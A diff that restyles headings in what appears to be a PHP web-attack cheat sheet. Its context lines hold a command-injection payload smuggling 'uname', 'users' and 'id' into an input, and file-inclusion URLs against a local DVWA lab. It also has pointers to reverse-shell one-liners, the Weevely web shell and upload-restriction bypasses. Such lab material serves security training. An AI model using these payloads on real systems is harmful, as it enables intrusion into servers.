@@ -3,8 +3,8 @@
 PHP
 ===
 
-SHELLS
-======
+Shells
+------
 
 * Reverse shell one-liners:
 ```
@@ -15,20 +15,19 @@ SHELLS
 * [Weevely](https://github.com/epinna/weevely3/) - great command line web shell with good features
 
 
-
-COMMAND INJECTION
+Command Injection
 =================
 
 * Try to use pipe, ampersands, etc. Example: `1 | uname -a & users & id`
 
 
-LOCAL FILE INCLUSION
+Local File Inclusion
 ====================
 
 Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
 Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`
 
-FILE UPLOAD
+File Upload
 ===========
 
 Image upload restrictions [bypass](http://hackers2devnull.blogspot.lt/2013/05/how-to-shell-server-via-image-upload.html):
